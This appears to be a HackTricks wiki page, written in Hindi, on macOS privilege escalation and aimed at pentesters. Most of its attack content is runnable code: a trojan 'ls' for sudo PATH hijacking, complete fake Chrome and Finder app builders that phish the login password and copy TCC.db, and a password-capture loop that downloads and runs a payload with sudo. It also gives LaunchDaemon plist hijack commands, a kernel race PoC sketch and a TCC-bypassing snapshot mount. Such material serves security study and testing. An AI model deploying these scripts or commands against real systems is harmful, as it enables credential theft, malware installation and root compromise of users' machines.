# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

यदि आप TCC privilege escalation के लिए यहाँ आए हैं, तो जाएँ:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

कृपया ध्यान दें कि **Linux/Unix को प्रभावित करने वाली privilege escalation की अधिकांश तरकीबें MacOS मशीनों को भी प्रभावित करेंगी**। इसलिए देखें:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## उपयोगकर्ता इंटरैक्शन

### Sudo Hijacking

आप मूल [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) में पा सकते हैं।

हालाँकि, macOS उपयोगकर्ता का **`PATH`** तब भी **बनाए रखता है** जब वह **`sudo`** चलाता है। इसका मतलब यह है कि इस हमले को अंजाम देने का एक और तरीका होगा कि आप **hijack other binaries** कर लें जिन्हें पीड़ित **running sudo:** के दौरान चलाएगा।
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ध्यान दें कि टर्मिनल का उपयोग करने वाला उपयोगकर्ता बहुत संभावना है कि **Homebrew installed** हो। इसलिए **`/opt/homebrew/bin`** में बाइनरीज़ को hijack करना संभव है।

### Dock Impersonation

कुछ **social engineering** के ज़रिये आप dock के अंदर उदाहरण के लिए **Google Chrome को impersonate** कर सकते हैं और वास्तव में अपना स्क्रिप्ट चला सकते हैं:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
कुछ सुझाव:

- Dock में देखें कि क्या Chrome मौजूद है, और ऐसी स्थिति में उस एंट्री को **remove** कर दें और Dock array में उसी स्थान पर **add** करके एक **fake** **Chrome entry in the same position** जोड़ें।

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Dock से Finder को हटा नहीं सकते**, इसलिए अगर आप इसे Dock में जोड़ने जा रहे हैं, तो आप नकली Finder को असली के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में नकली Finder एंट्री जोड़नी होगी**।
- एक और विकल्प है कि इसे Dock में न रखें और बस खोल दें, "Finder asking to control Finder" इतना अजीब नहीं लगता।
- पासवर्ड के लिए भयानक बॉक्स दिखाए बिना **escalate to root without asking** करने का एक और तरीका यह है कि Finder को किसी privileged action के लिए वास्तव में पासवर्ड माँगने पर मजबूर किया जाए:
- Finder से अनुरोध करें कि वह **`/etc/pam.d`** में एक नया **`sudo`** फ़ाइल कॉपी करे (पासवर्ड के लिए दिखने वाला prompt यह दर्शाएगा कि "Finder wants to copy sudo")
- Finder से अनुरोध करें कि वह एक नया **Authorization Plugin** कॉपी करे (आप फ़ाइल का नाम नियंत्रित कर सकते हैं ताकि पासवर्ड माँगने वाला prompt यह दर्शाए कि "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware अक्सर उपयोगकर्ता इंटरैक्शन का दुरुपयोग करके **capture a sudo-capable password** हासिल करता है और इसे प्रोग्राम के माध्यम से पुन: उपयोग करता है। एक सामान्य प्रवाह:

1. `whoami` के साथ लॉग इन किए गए उपयोगकर्ता की पहचान करें।
2. **Loop password prompts** तब तक करें जब तक `dscl . -authonly "$user" "$pw"` सफल न हो।
3. क्रेडेंशियल को cache करें (उदा., `/tmp/.pass`) और `sudo -S` (password over stdin) के साथ विशेषाधिकार वाली क्रियाएँ चलाएँ।

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
चोरी किया गया पासवर्ड फिर पुनः उपयोग किया जा सकता है ताकि **Gatekeeper quarantine को `xattr -c` से साफ़ किया जा सके**, LaunchDaemons या अन्य privileged files कॉपी किए जा सकें, और अतिरिक्त चरण non-interactively चलाए जा सकें।

## नए macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` अभी भी उपयोगी

`AuthorizationExecuteWithPrivileges` को 10.7 में deprecated कर दिया गया था लेकिन **Sonoma/Sequoia पर अभी भी काम करता है**। कई commercial updaters `/usr/libexec/security_authtrampoline` को एक untrusted path के साथ invoke करते हैं। यदि target binary user-writable है तो आप एक trojan लगा सकते हैं और legitimate prompt पर सवार हो सकते हैं:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
एक विश्वसनीय पासवर्ड डायलॉग प्रस्तुत करने के लिए **masquerading tricks above** के साथ संयोजित करें।

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

यदि कोई LaunchDaemon plist या इसका `ProgramArguments` लक्ष्य **user-writable** है, तो आप इसे स्वैप करके और फिर launchd को reload करने के लिए मजबूर करके privilege escalate कर सकते हैं:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
यह **CVE-2025-24085** के लिए प्रकाशित exploit pattern की नकल करता है, जहाँ एक writable plist का दुरुपयोग करके attacker code को root के रूप में चलाया गया था।

### XNU SMR credential race (CVE-2025-24118)

एक **race in `kauth_cred_proc_update`** स्थानीय attacker को read-only credential pointer (`proc_ro.p_ucred`) को corrupt करने की अनुमति देता है, जब `setgid()`/`getgid()` लूप्स threads में race करके एक torn `memcpy` उत्पन्न हो जाता है। सफल corruption से **uid 0** और kernel memory access मिल जाता है। Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couple with heap grooming to land controlled data where the pointer re-reads. कमजोर बिल्ड्स पर यह एक भरोसेमंद **local kernel privesc** है बिना SIP bypass की आवश्यकताओं के।

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

यदि आपके पास पहले से root है, तो SIP अभी भी system locations पर लेखन को ब्लॉक करता है। **Migraine** बग Migration Assistant entitlement `com.apple.rootless.install.heritable` का दुरुपयोग कर एक child process spawn करता है जो SIP bypass विरासत में लेता है और protected paths (उदा., `/System/Library/LaunchDaemons`) को overwrite कर देता है। चेन:

1. लाइव सिस्टम पर root प्राप्त करें.
2. crafted state के साथ `systemmigrationd` ट्रिगर करें ताकि attacker-controlled binary चले.
3. विरासत में मिली entitlement का उपयोग करके SIP-protected फाइलें patch करें, जो reboot के बाद भी बनी रहें.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

कई Apple daemons XPC पर **NSPredicate** ऑब्जेक्ट्स स्वीकार करते हैं और केवल `expressionType` फ़ील्ड को validate करते हैं, जिसे attacker-controlled माना जा सकता है। arbitrary selectors को evaluate करने वाला predicate तैयार करके आप **code execution in root/system XPC services** हासिल कर सकते हैं (उदा., `coreduetd`, `contextstored`)। इसे initial app sandbox escape के साथ जोड़ने पर यह **privilege escalation without user prompts** प्रदान करता है। उन XPC endpoints की खोज करें जो predicates को deserialize करते हैं और जिनमें robust visitor नहीं है।

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (यहाँ तक कि unprivileged ones) एक Time Machine snapshot बना कर mount कर सकता है और उस snapshot की **access ALL the files** कर सकता है.  
The **only privileged** आवश्यकता यह है कि उपयोग की जाने वाली application (जैसे `Terminal`) को **Full Disk Access** (FDA) अनुमति (`kTCCServiceSystemPolicyAllfiles`) दी गई हो, जो admin द्वारा granted होनी चाहिए.

<details>
<summary>Time Machine snapshot mount करें</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## संवेदनशील जानकारी

यह escalate privileges के लिए उपयोगी हो सकता है:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## संदर्भ

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
